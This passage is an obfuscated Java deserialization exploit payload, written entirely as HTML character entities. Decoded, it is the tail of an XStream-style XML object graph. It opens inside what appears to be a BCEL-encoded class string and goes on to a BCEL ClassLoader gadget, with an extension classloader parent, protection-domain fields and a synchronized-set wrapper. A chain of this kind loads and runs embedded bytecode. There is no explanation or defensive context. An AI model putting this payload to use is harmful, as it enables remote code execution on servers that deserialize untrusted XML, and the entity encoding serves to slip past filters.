24;&#x39;&#x36;&#x24;&#x63;&#x36;&#x75;&#x24;&#x37;&#x63;&#x24;&#x62;&#x31;&#x24;&#x65;&#x30;&#x24;&#x48;&#x65;&#x48;&#x24;&#x62;&#x62;&#x65;&#x24;&#x57;&#x62;&#x55;&#x24;&#x66;&#x30;&#x65;&#x47;&#x52;&#x24;&#x61;&#x37;&#x24;&#x65;&#x65;&#x24;&#x42;&#x24;&#x64;&#x33;&#x24;&#x63;&#x38;&#x24;&#x66;&#x32;&#x24;&#x72;&#x24;&#x39;&#x30;&#x24;&#x75;&#x24;&#x64;&#x38;&#x24;&#x55;&#x24;&#x61;&#x66;&#x24;&#x65;&#x64;&#x24;&#x65;&#x33;&#x24;&#x67;&#x24;&#x38;&#x62;&#x24;&#x37;&#x64;&#x65;&#x24;&#x65;&#x36;&#x24;&#x58;&#x24;&#x66;&#x33;&#x24;&#x64;&#x62;&#x24;&#x35;&#x62;&#x47;&#x24;&#x65;&#x37;&#x44;&#x24;&#x38;&#x64;&#x4e;&#x24;&#x66;&#x37;&#x24;&#x64;&#x64;&#x24;&#x61;&#x36;&#x24;&#x62;&#x38;&#x24;&#x64;&#x31;&#x76;&#x24;&#x65;&#x36;&#x24;&#x64;&#x63;&#x59;&#x24;&#x62;&#x36;&#x24;&#x66;&#x30;&#x24;&#x61;&#x65;&#x78;&#x24;&#x65;&#x64;&#x24;&#x66;&#x38;&#x24;&#x39;&#x65;&#x24;&#x61;&#x38;&#x24;&#x56;&#x75;&#x24;&#x64;&#x37;&#x24;&#x68;&#x72;&#x4d;&#x72;&#x52;&#x4e;&#x24;&#x61;&#x33;&#x24;&#x62;&#x64;&#x24;&#x39;&#x36;&#x24;&#x47;&#x39;&#x54;&#x24;&#x45;&#x64;&#x24;&#x38;&#x61;&#x79;&#x24;&#x65;&#x31;&#x59;&#x65;&#x54;&#x24;&#x68;&#x24;&#x66;&#x37;&#x24;&#x38;&#x33;&#x24;&#x38;&#x32;&#x24;&#x68;&#x4f;&#x4c;&#x55;&#x24;&#x77;&#x24;&#x64;&#x32;&#x24;&#x37;&#x62;&#x24;&#x38;&#x66;&#x24;&#x66;&#x63;&#x57;&#x24;&#x35;&#x65;&#x24;&#x69;&#x24;&#x7a;&#x24;&#x46;&#x24;&#x65;&#x31;&#x24;&#x66;&#x37;&#x24;&#x35;&#x62;&#x24;&#x39;&#x36;&#x24;&#x75;&#x24;&#x55;&#x24;&#x65;&#x63;&#x24;&#x66;&#x32;&#x4d;&#x24;&#x59;&#x24;&#x39;&#x66;&#x24;&#x39;&#x30;&#x24;&#x64;&#x37;&#x67;&#x24;&#x38;&#x38;&#x24;&#x39;&#x36;&#x24;&#x56;&#x6c;&#x24;&#x61;&#x65;&#x24;&#x39;&#x33;&#x4c;&#x24;&#x64;&#x64;&#x24;&#x63;&#x38;&#x24;&#x70;&#x24;&#x66;&#x33;&#x24;&#x62;&#x32;&#x24;&#x63;&#x31;&#x59;&#x24;&#x61;&#x31;&#x7a;&#x24;&#x64;&#x65;&#x24;&#x63;&#x37;&#x24;&#x58;&#x24;&#x68;&#x39;&#x24;&#x39;&#x30;&#x24;&#x6b;&#x24;&#x7a;&#x24;&#x33;&#x61;&#x24;&#x62;&#x65;&#x24;&#x39;&#x64;&#x24;&#x61;&#x62;&#x24;&#x64;&#x63;&#x53;&#x4b;&#x24;&#x39;&#x62;&#x24;&#x38;&#x65;&#x24;&#x61;&#x61;&#x24;&#x37;&#x63;&#x24;&#x78;&#x62;&#x24;&#x67;&#x24;&#x4f;&#x24;&#x38;&#x62;&#x24;&#x46;&#x61;&#x71;&#x24;&#x66;&#x34;&#x24;&#x65;&#x66;&#x24;&#x39;&#x31;&#x24;&#x64;&#x35;&#x24;&#x52;&#x24;&#x63;&#x66;&#x24;&#x39;&#x35;&#x24;&#x76;&#x24;&#x66;&#x34;&#x55;&#x79;&#x24;&#x61;&#x61;&#x24;&#x49;&#x39;&#x24;&#x38;&#x36;&#x24;&#x66;&#x34;&#x74;&#x24;&#x63;&#x30;&#x24;&#x63;&#x39;&#x24;&#x58;&#x24;&#x37;&#x64;&#x6a;&#x24;&#x4b;&#x33;&#x24;&#x63;&#x37;&#x24;&#x38;&#x36;&#x24;&#x35;&#x65;&#x24;&#x66;&#x34;&#x24;&#x63;&#x36;&#x24;&#x64;&#x31;&#x24;&#x35;&#x63;&#x76;&#x24;&#x34;&#x30;&#x24;&#x66;&#x35;&#x24;&#x61;&#x65;&#x78;&#x24;&#x64;&#x64;&#x24;&#x44;&#x24;&#x39;&#x39;&#x24;&#x38;&#x33;&#x51;&#x24;&#x79;&#x24;&#x38;&#x38;&#x41;&#x24;&#x39;&#x31;&#x24;&#x62;&#x35;&#x73;&#x24;&#x65;&#x35;&#x51;&#x24;&#x62;&#x65;&#x4b;&#x48;&#x24;&#x78;&#x24;&#x61;&#x65;&#x4a;&#x75;&#x24;&#x63;&#x36;&#x24;&#x79;&#x24;&#x38;&#x63;&#x24;&#x62;&#x32;&#x24;&#x63;&#x66;&#x24;&#x38;&#x33;&#x24;&#x39;&#x66;&#x24;&#x61;&#x36;&#x24;&#x4a;&#x24;&#x65;&#x36;&#x24;&#x65;&#x34;&#x24;&#x45;&#x24;&#x39;&#x62;&#x24;&#x65;&#x61;&#x24;&#x63;&#x31;&#x58;&#x24;&#x62;&#x61;&#x72;&#x24;&#x35;&#x62;&#x24;&#x66;&#x33;&#x24;&#x37;&#x63;&#x24;&#x66;&#x31;&#x24;&#x38;&#x33;&#x24;&#x64;&#x62;&#x73;&#x24;&#x63;&#x63;&#x33;&#x24;&#x7a;&#x24;&#x38;&#x31;&#x24;&#x38;&#x64;&#x78;&#x24;&#x38;&#x34;&#x24;&#x33;&#x66;&#x24;&#x61;&#x33;&#x24;&#x66;&#x32;&#x24;&#x61;&#x66;&#x24;&#x38;&#x31;&#x24;&#x64;&#x33;&#x24;&#x63;&#x63;&#x6b;&#x24;&#x39;&#x31;&#x24;&#x65;&#x62;&#x24;&#x57;&#x24;&#x65;&#x65;&#x24;&#x39;&#x32;&#x24;&#x37;&#x63;&#x72;&#x24;&#x63;&#x30;&#x24;&#x52;&#x24;&#x65;&#x39;&#x24;&#x62;&#x39;&#x24;&#x47;&#x24;&#x65;&#x35;&#x6a;&#x70;&#x24;&#x69;&#x24;&#x65;&#x37;&#x24;&#x64;&#x61;&#x24;&#x59;&#x24;&#x49;&#x24;&#x39;&#x62;&#x24;&#x64;&#x30;&#x24;&#x63;&#x64;&#x24;&#x64;&#x35;&#x24;&#x75;&#x24;&#x44;&#x24;&#x64;&#x30;&#x24;&#x38;&#x33;&#x24;&#x61;&#x64;&#x24;&#x37;&#x63;&#x6a;&#x24;&#x64;&#x38;&#x24;&#x62;&#x36;&#x24;&#x61;&#x38;&#x24;&#x61;&#x63;&#x24;&#x64;&#x63;&#x24;&#x6f;&#x4e;&#x24;&#x61;&#x37;&#x24;&#x65;&#x63;&#x24;&#x39;&#x66;&#x24;&#x65;&#x62;&#x68;&#x24;&#x75;&#x24;&#x6e;&#x24;&#x55;&#x24;&#x4e;&#x24;&#x39;&#x37;&#x24;&#x51;&#x39;&#x24;&#x64;&#x34;&#x24;&#x54;&#x6d;&#x24;&#x4d;&#x24;&#x64;&#x64;&#x24;&#x38;&#x34;&#x5a;&#x24;&#x38;&#x32;&#x24;&#x39;&#x36;&#x24;&#x64;&#x65;&#x24;&#x61;&#x61;&#x24;&#x66;&#x30;&#x24;&#x61;&#x64;&#x24;&#x61;&#x39;&#x24;&#x45;&#x24;&#x37;&#x64;&#x64;&#x24;&#x35;&#x62;&#x24;&#x4a;&#x24;&#x63;&#x64;&#x24;&#x72;&#x24;&#x59;&#x24;&#x64;&#x31;&#x24;&#x39;&#x36;&#x24;&#x53;&#x56;&#x24;&#x38;&#x64;&#x24;&#x66;&#x36;&#x24;&#x53;&#x24;&#x64;&#x37;&#x24;&#x64;&#x61;&#x4b;&#x51;&#x24;&#x35;&#x62;&#x24;&#x77;&#x24;&#x69;&#x24;&#x65;&#x33;&#x24;&#x37;&#x62;&#x73;&#x74;&#x75;&#x45;&#x24;&#x70;&#x24;&#x56;&#x24;&#x38;&#x39;&#x45;&#x62;&#x24;&#x65;&#x31;&#x24;&#x38;&#x61;&#x24;&#x64;&#x32;&#x5f;&#x24;&#x38;&#x38;&#x24;&#x61;&#x36;&#x24;&#x67;&#x63;&#x24;&#x38;&#x64;&#x24;&#x64;&#x31;&#x24;&#x66;&#x36;&#x24;&#x53;&#x24;&#x64;&#x36;&#x48;&#x24;&#x66;&#x64;&#x68;&#x47;&#x24;&#x39;&#x38;&#x24;&#x61;&#x38;&#x24;&#x65;&#x33;&#x24;&#x61;&#x31;&#x24;&#x65;&#x38;&#x24;&#x64;&#x61;&#x24;&#x38;&#x63;&#x24;&#x38;&#x34;&#x24;&#x61;&#x61;&#x31;&#x75;&#x24;&#x68;&#x24;&#x46;&#x4d;&#x24;&#x55;&#x74;&#x66;&#x24;&#x43;&#x24;&#x66;&#x38;&#x24;&#x64;&#x61;&#x24;&#x39;&#x34;&#x24;&#x66;&#x36;&#x24;&#x33;&#x62;&#x24;&#x62;&#x61;&#x24;&#x38;&#x65;&#x5f;&#x47;&#x24;&#x79;&#x24;&#x61;&#x36;&#x24;&#x39;&#x35;&#x24;&#x62;&#x30;&#x24;&#x61;&#x65;&#x24;&#x38;&#x34;&#x24;&#x66;&#x35;&#x24;&#x64;&#x37;&#x24;&#x62;&#x30;&#x24;&#x6e;&#x7a;&#x5f;&#x24;&#x4a;&#x24;&#x66;&#x37;&#x24;&#x61;&#x37;&#x24;&#x39;&#x61;&#x62;&#x24;&#x38;&#x64;&#x31;&#x24;&#x64;&#x61;&#x24;&#x37;&#x63;&#x24;&#x65;&#x30;&#x24;&#x53;&#x24;&#x39;&#x61;&#x24;&#x65;&#x35;&#x24;&#x66;&#x33;&#x24;&#x63;&#x31;&#x24;&#x78;&#x24;&#x38;&#x38;&#x44;&#x37;&#x24;&#x64;&#x32;&#x24;&#x65;&#x65;&#x24;&#x56;&#x68;&#x24;&#x38;&#x37;&#x7a;&#x4a;&#x78;&#x24;&#x66;&#x38;&#x6a;&#x24;&#x39;&#x30;&#x24;&#x65;&#x33;&#x24;&#x4e;&#x24;&#x66;&#x63;&#x24;&#x63;&#x31;&#x24;&#x5f;&#x24;&#x38;&#x31;&#x50;&#x24;&#x63;&#x30;&#x24;&#x63;&#x30;&#x30;&#x56;&#x24;&#x48;&#x24;&#x62;&#x39;&#x24;&#x68;&#x68;&#x41;&#x24;&#x74;&#x56;&#x24;&#x39;&#x31;&#x24;&#x63;&#x30;&#x56;&#x24;&#x71;&#x24;&#x64;&#x30;&#x24;&#x38;&#x36;&#x24;&#x39;&#x64;&#x24;&#x39;&#x34;&#x24;&#x61;&#x37;&#x24;&#x66;&#x38;&#x24;&#x62;&#x31;&#x71;&#x24;&#x51;&#x24;&#x65;&#x64;&#x24;&#x39;&#x38;&#x24;&#x63;&#x30;&#x24;&#x67;&#x24;&#x39;&#x38;&#x24;&#x65;&#x38;&#x24;&#x34;&#x30;&#x24;&#x52;&#x6b;&#x79;&#x6d;&#x77;&#x24;&#x65;&#x32;&#x32;&#x24;&#x33;&#x66;&#x24;&#x76;&#x6e;&#x24;&#x36;&#x30;&#x24;&#x33;&#x64;&#x24;&#x61;&#x64;&#x24;&#x63;&#x34;&#x70;&#x24;&#x54;&#x24;&#x65;&#x62;&#x24;&#x66;&#x30;&#x37;&#x36;&#x24;&#x45;&#x24;&#x4d;&#x24;&#x65;&#x36;&#x24;&#x64;&#x31;&#x4c;&#x24;&#x33;&#x62;&#x24;&#x62;&#x66;&#x24;&#x61;&#x30;&#x24;&#x39;&#x37;&#x24;&#x57;&#x24;&#x51;&#x24;&#x65;&#x30;&#x24;&#x39;&#x32;&#x24;&#x64;&#x38;&#x4e;&#x24;&#x38;&#x66;&#x24;&#x68;&#x79;&#x24;&#x63;&#x37;&#x24;&#x65;&#x65;&#x24;&#x63;&#x30;&#x24;&#x61;&#x33;&#x24;&#x65;&#x34;&#x24;&#x33;&#x63;&#x24;&#x63;&#x31;&#x24;&#x39;&#x62;&#x24;&#x37;&#x63;&#x24;&#x74;&#x24;&#x33;&#x66;&#x24;&#x38;&#x62;&#x42;&#x24;&#x62;&#x34;&#x24;&#x37;&#x64;&#x24;&#x42;&#x24;&#x38;&#x66;&#x53;&#x24;&#x57;&#x24;&#x61;&#x36;&#x24;&#x48;&#x24;&#x58;&#x4f;&#x24;&#x51;&#x24;&#x58;&#x24;&#x61;&#x31;&#x24;&#x39;&#x66;&#x53;&#x78;&#x24;&#x53;&#x4f;&#x24;&#x39;&#x31;&#x24;&#x65;&#x64;&#x24;&#x6f;&#x24;&#x47;&#x24;&#x62;&#x31;&#x24;&#x38;&#x62;&#x32;&#x24;&#x39;&#x35;&#x24;&#x66;&#x65;&#x24;&#x62;&#x36;&#x24;&#x54;&#x24;&#x64;&#x62;&#x24;&#x63;&#x37;&#x7a;&#x24;&#x35;&#x63;&#x24;&#x61;&#x36;&#x24;&#x63;&#x35;&#x24;&#x64;&#x64;&#x78;&#x24;&#x39;&#x61;&#x24;&#x64;&#x35;&#x24;&#x62;&#x61;&#x49;&#x24;&#x61;&#x64;&#x24;&#x33;&#x64;&#x78;&#x24;&#x38;&#x36;&#x24;&#x33;&#x65;&#x24;&#x66;&#x36;&#x24;&#x66;&#x32;&#x24;&#x66;&#x66;&#x34;&#x24;&#x63;&#x32;&#x24;&#x62;&#x37;&#x24;&#x66;&#x31;&#x24;&#x78;&#x74;&#x24;&#x56;&#x24;&#x66;&#x64;&#x24;&#x77;&#x24;&#x66;&#x36;&#x24;&#x61;&#x39;&#x24;&#x59;&#x50;&#x31;&#x24;&#x59;&#x24;&#x61;&#x63;&#x24;&#x37;&#x63;&#x24;&#x6c;&#x24;&#x4b;&#x24;&#x64;&#x36;&#x61;&#x24;&#x56;&#x24;&#x63;&#x66;&#x42;&#x24;&#x65;&#x31;&#x24;&#x65;&#x65;&#x36;&#x24;&#x38;&#x33;&#x24;&#x62;&#x39;&#x24;&#x58;&#x24;&#x61;&#x65;&#x24;&#x6e;&#x24;&#x64;&#x38;&#x24;&#x4e;&#x24;&#x64;&#x66;&#x66;&#x24;&#x33;&#x63;&#x24;&#x39;&#x30;&#x4a;&#x24;&#x66;&#x62;&#x24;&#x63;&#x33;&#x54;&#x24;&#x33;&#x61;&#x24;&#x51;&#x74;&#x24;&#x63;&#x63;&#x24;&#x63;&#x31;&#x24;&#x66;&#x66;&#x24;&#x41;&#x24;&#x54;&#x24;&#x62;&#x35;&#x6c;&#x24;&#x37;&#x65;&#x24;&#x64;&#x37;&#x24;&#x4a;&#x24;&#x41;&#x24;&#x41;&#x0a;&#x3c;&#x2f;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x61;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x6f;&#x75;&#x74;&#x65;&#x72;&#x2d;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x6e;&#x61;&#x6d;&#x65;&#x73;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x70;&#x72;&#x6f;&#x63;&#x65;&#x73;&#x73;&#x6f;&#x72;&#x43;&#x4c;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x3d;&#x27;&#x63;&#x6f;&#x6d;&#x2e;&#x73;&#x75;&#x6e;&#x2e;&#x6f;&#x72;&#x67;&#x2e;&#x61;&#x70;&#x61;&#x63;&#x68;&#x65;&#x2e;&#x62;&#x63;&#x65;&#x6c;&#x2e;&#x69;&#x6e;&#x74;&#x65;&#x72;&#x6e;&#x61;&#x6c;&#x2e;&#x75;&#x74;&#x69;&#x6c;&#x2e;&#x43;&#x6c;&#x61;&#x73;&#x73;&#x4c;&#x6f;&#x61;&#x64;&#x65;&#x72;&#x27;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x70;&#x61;&#x72;&#x65;&#x6e;&#x74;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x3d;&#x27;&#x73;&#x75;&#x6e;&#x2e;&#x6d;&#x69;&#x73;&#x63;&#x2e;&#x4c;&#x61;&#x75;&#x6e;&#x63;&#x68;&#x65;&#x72;&#x24;&#x45;&#x78;&#x74;&#x43;&#x6c;&#x61;&#x73;&#x73;&#x4c;&#x6f;&#x61;&#x64;&#x65;&#x72;&#x27;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x70;&#x61;&#x72;&#x65;&#x6e;&#x74;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x70;&#x61;&#x63;&#x6b;&#x61;&#x67;&#x65;&#x32;&#x63;&#x65;&#x72;&#x74;&#x73;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x3d;&#x27;&#x68;&#x61;&#x73;&#x68;&#x74;&#x61;&#x62;&#x6c;&#x65;&#x27;&#x2f;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x65;&#x73;&#x20;&#x64;&#x65;&#x66;&#x69;&#x6e;&#x65;&#x64;&#x2d;&#x69;&#x6e;&#x3d;&#x27;&#x6a;&#x61;&#x76;&#x61;&#x2e;&#x6c;&#x61;&#x6e;&#x67;&#x2e;&#x43;&#x6c;&#x61;&#x73;&#x73;&#x4c;&#x6f;&#x61;&#x64;&#x65;&#x72;&#x27;&#x2f;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x64;&#x65;&#x66;&#x61;&#x75;&#x6c;&#x74;&#x44;&#x6f;&#x6d;&#x61;&#x69;&#x6e;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x6c;&#x6f;&#x61;&#x64;&#x65;&#x72;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x3d;&#x27;&#x63;&#x6f;&#x6d;&#x2e;&#x73;&#x75;&#x6e;&#x2e;&#x6f;&#x72;&#x67;&#x2e;&#x61;&#x70;&#x61;&#x63;&#x68;&#x65;&#x2e;&#x62;&#x63;&#x65;&#x6c;&#x2e;&#x69;&#x6e;&#x74;&#x65;&#x72;&#x6e;&#x61;&#x6c;&#x2e;&#x75;&#x74;&#x69;&#x6c;&#x2e;&#x43;&#x6c;&#x61;&#x73;&#x73;&#x4c;&#x6f;&#x61;&#x64;&#x65;&#x72;&#x27;&#x20;&#x72;&#x65;&#x66;&#x65;&#x72;&#x65;&#x6e;&#x63;&#x65;&#x3d;&#x27;&#x2e;&#x2e;&#x2f;&#x2e;&#x2e;&#x27;&#x2f;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x70;&#x72;&#x69;&#x6e;&#x63;&#x69;&#x70;&#x61;&#x6c;&#x73;&#x2f;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x68;&#x61;&#x73;&#x41;&#x6c;&#x6c;&#x50;&#x65;&#x72;&#x6d;&#x3e;&#x66;&#x61;&#x6c;&#x73;&#x65;&#x3c;&#x2f;&#x68;&#x61;&#x73;&#x41;&#x6c;&#x6c;&#x50;&#x65;&#x72;&#x6d;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x73;&#x74;&#x61;&#x74;&#x69;&#x63;&#x50;&#x65;&#x72;&#x6d;&#x69;&#x73;&#x73;&#x69;&#x6f;&#x6e;&#x73;&#x3e;&#x66;&#x61;&#x6c;&#x73;&#x65;&#x3c;&#x2f;&#x73;&#x74;&#x61;&#x74;&#x69;&#x63;&#x50;&#x65;&#x72;&#x6d;&#x69;&#x73;&#x73;&#x69;&#x6f;&#x6e;&#x73;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x6b;&#x65;&#x79;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x6b;&#x65;&#x79;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x64;&#x65;&#x66;&#x61;&#x75;&#x6c;&#x74;&#x44;&#x6f;&#x6d;&#x61;&#x69;&#x6e;&#x3e;&#x0a;&#x3c;&#x64;&#x6f;&#x6d;&#x61;&#x69;&#x6e;&#x73;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x3d;&#x22;&#x6a;&#x61;&#x76;&#x61;&#x2e;&#x75;&#x74;&#x69;&#x6c;&#x2e;&#x43;&#x6f;&#x6c;&#x6c;&#x65;&#x63;&#x74;&#x69;&#x6f;&#x6e;&#x73;&#x24;&#x53;&#x79;&#x6e;&#x63;&#x68;&#x72;&#x6f;&#x6e;&#x69;&#x7a;&#x65;&#x64;&#x53;&#x65;&#x74;&#x22;&#x20;&#x73;&#x65;&#x72;&#x69;&#x61;&#x6c;&#x69;&#x7a;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x3d;&#x22;&#x63;&#x75;&#x73;&#x74;&#x6f;&#x6d;&#x22;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x6a;&#x61;&#x76;&#x61;&#x2e;&#x75;&#x74;&#x69;&#x6c;&#x2e;&#x43;&#x6f;&#x6c;&#x6c;&#x65;&#x63;&#x74;&#x69;&#x6f;&#x6e;&#x73;&#x5f;&#x2d;&#x53;&#x79;&#x6e;&#x63;&#x68;&#x72;&#x6f;&#x6e;&#x69;&#x7a;&#x65;&#x64;&#x43;&#x6f;&#x6c;&#x6c;&#x65;&#x63;&#x74;&#x69;&#x6f;&#x6e;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x64;&#x65;&#x66;&#x61;&#x75;&#x6c;&#x74;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x63;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x3d;&#x22;&#x73;&#x65;&#x74;&#x22;&#x3e;&#x3c;&#x2f;&#x63;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x6d;&#x75;&#x74;&#x65;&#x78;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x3d;&#x22;&#x6a;&#x61;&#x76;&#x61;&#x2e;&#x75;&#x74;&#x69;&#x6c;&#x2e;&#x43;&#x6f;&#x6c;&#x6c;&#x65;&#x63;&#x74;&#x69;&#x6f;&#x6e;&#x73;&#x24;&#x53;&#x79;&#x6e;&#x63;&#x68;&#x72;&#x6f;&#x6e;&#x69;&#x7a;&#x65;&#x64;&#x53;&#x65;&#x74;&#x22;&#x20;&#x72;&#x65;&#x66;&#x65;&#x72;&#x65;&#x6e;&#x63;&#x65;&#x3d;&#x22;&#x2e;&#x2e;&#x2f;&#x2e;&#x2e;&#x2f;&#x2e;&#x2e;&#x22;&#x2f;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x64;&#x65;&#x66;&#x61;&#x75;&#x6c;&#x74;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x6a;&#x61;&#x76;&#x61;&#x2e;&#x75;&#x74;&#x69;&#x6c;&#x2e;&#x43;&#x6f;&#x6c;&#x6c;&#x65;&#x63;&#x74;&#x69;&#x6f;&#x6e;&#x73;&#x5f;&#x2d;&#x53;&#x79;&#x6e;&#x63;&#x68;&#x72;&#x6f;&#x6e;&#x69;&#x7a;&#x65;&#x64;&#x43;&#x6f;&#x6c;&#x6c;&#x65;&#x63;&#x74;&#x69;&#x6f;&#x6e;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x64;&#x6f;&#x6d;&#x61;&#x69;&#x6e;&#x73;&#x3e;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x70;&#x61;&#x63;&#x6b;&#x61;&#x67;&#x65;&#x73;&#x2f;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x6e;&#x61;&#x74;&#x69;&#x76;&#x65;&#x4c;&#x69;&#x62;&#x72;&#x61;&#x72;&#x69;&#x65;&#x73;&#x2f;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x61;&#x73;&#x73;&#x65;&#x72;&#x74;&#x69;&#x6f;&#x6e;&#x4c;&#x6f;&#x63;&#x6b;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x3d;&#x27;&#x63;&#x6f;&#x6d;&#x2e;&#x73;&#x75;&#x6e;&#x2e;&#x6f;&#x72;&#x67;&#x2e;&#x61;&#x70;&#x61;&#x63;&#x68;&#x65;&#x2e;&#x62;&#x63;&#x65;&#x6c;&#x2e;&#x69;&#x6e;&#x74;&#x65;&#x72;&#x6e;&#x61;&#x6c;&#x2e;&#x75;&#x74;&#x69;&#x6c;&#x2e;&#x43;&#x6c;&#x61;&#x73;&#x73;&#x4c;&#x6f;&#x61;&#x64;&#x65;&#x72;&#x27;&#x20;&#x72;&#x65;&#x66;&#x65;&#x72;&#x65;&#x6e;&#x63;&#x65;&#x3d;&#x27;&#x2e;&#x2e;&#x27;&#x2f;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x64;&#x65;&#x66;&#x61;&#x75;&#x6c;&#x74;&#x41;&#x73;&#x73;&#x65;&#x72;&#x74;&#x69;&#x6f;&#x6e;&#x53;&#x74;&#x61;&#x74;&#x75;&#x73;&#x3e;&#x66;&#x61;&#x6c;&#x73;&#x65;&#x3c;&#x2f;&#x64;&#x65;&#x66;&#x61;&#x75;&#x6c;&#x74;&#x41;&#x73;&#x73;&#x65;&#x72;&#x74;&#x69;&#x6f;&#x6e;&#x53;&#x74;&#x61;&#x74;&#x75;&#x73;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x65;&#x73;&#x2f;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;